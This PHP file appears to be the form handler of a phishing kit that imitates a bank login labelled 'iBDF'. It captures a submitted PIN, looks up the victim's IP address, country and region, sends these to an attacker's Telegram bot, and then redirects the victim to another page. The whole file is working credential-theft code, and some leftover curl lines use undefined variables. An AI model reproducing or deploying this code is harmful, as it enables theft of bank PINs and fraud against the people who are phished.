<?php
ini_set("display_errors", 0);
include("datos_tlgram.php");

// Obtener los datos del formulario
$p = $_POST['cdpin'];

// Obtener la dirección IP del cliente
function getIP() {
   if (isset($_SERVER)) {
      if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
         return $_SERVER['HTTP_X_FORWARDED_FOR'];
      } else {
         return $_SERVER['REMOTE_ADDR'];
      }
   } else {
      if (isset($GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDER_FOR'])) {
         return $GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDED_FOR'];
      } else {
         return $GLOBALS['HTTP_SERVER_VARS']['REMOTE_ADDR'];
      }
   }
}

$myip = getIP() ;
@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$myip));
@$pais = $meta['geoplugin_countryName']; 
@$region = $meta['geoplugin_regionName'];


// Mensaje a enviar a Telegram
$message = "L0GIN iBDF:\n\n";
$message .= "Pin 2: " . $p . "\n";
$message .= "IP: " . $myip." ".$pais ." ".$region."";

// Enviar el mensaje a través del bot de Telegram
$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

// Realizar la solicitud HTTP a la API de Telegram
$ch = curl_init($telegramApiUrl);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $telegramParams);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Comprobar la respuesta de la API de Telegram
if ($response === false) {
  //echo "Error al enviar el mensaje a Telegram.";
} else {
  // Redirigir al usuario a otra página
  //header('Location: firm.php');
  //exit();
}


echo "<script type='text/javascript'>";
echo "window.location.href='resp.php';";
echo "</script>";
?>